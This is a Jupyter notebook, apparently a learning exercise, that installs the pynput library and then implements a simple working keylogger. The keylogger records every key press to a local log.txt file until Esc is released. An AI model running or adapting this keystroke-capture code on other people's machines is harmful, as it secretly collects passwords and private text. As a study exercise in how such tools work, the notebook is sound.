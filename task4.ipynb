{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "3943822b-e677-41f5-96f5-d8e3857f1911",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Collecting pynputNote: you may need to restart the kernel to use updated packages.\n",
      "\n",
      "  Downloading pynput-1.7.7-py2.py3-none-any.whl.metadata (31 kB)\n",
      "Requirement already satisfied: six in c:\\users\\harsh\\anaconda3\\lib\\site-packages (from pynput) (1.16.0)\n",
      "Downloading pynput-1.7.7-py2.py3-none-any.whl (90 kB)\n",
      "   ---------------------------------------- 0.0/90.2 kB ? eta -:--:--\n",
      "   ------------- -------------------------- 30.7/90.2 kB 660.6 kB/s eta 0:00:01\n",
      "   ------------------------------------ --- 81.9/90.2 kB 919.0 kB/s eta 0:00:01\n",
      "   ---------------------------------------- 90.2/90.2 kB 734.0 kB/s eta 0:00:00\n",
      "Installing collected packages: pynput\n",
      "Successfully installed pynput-1.7.7\n"
     ]
    }
   ],
   "source": [
    "pip install pynput\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "49566918-1670-4c93-a787-0b2e275eb8ae",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pynput.keyboard import Key, Listener\n",
    "\n",
    "keys = []\n",
    "\n",
    "def on_each_key_press(key):\n",
    "    keys.append(key)\n",
    "    write_keys_to_file(keys)\n",
    "\n",
    "\n",
    "def write_keys_to_file(keys):\n",
    "    with open('log.txt', 'w') as logfile:\n",
    "        for key in keys:\n",
    "            key = str(key).replace(\"'\", \"\")\n",
    "            logfile.write(key)\n",
    "\n",
    "\n",
    "def on_each_key_release(key):\n",
    "    if key == Key.esc:\n",
    "        return False\n",
    "\n",
    "\n",
    "with Listener(\n",
    "    on_press = on_each_key_press,\n",
    "    on_release = on_each_key_release\n",
    "    ) as listener:\n",
    "    listener.join()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d28ac7c6-474b-4414-99aa-096721d53334",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
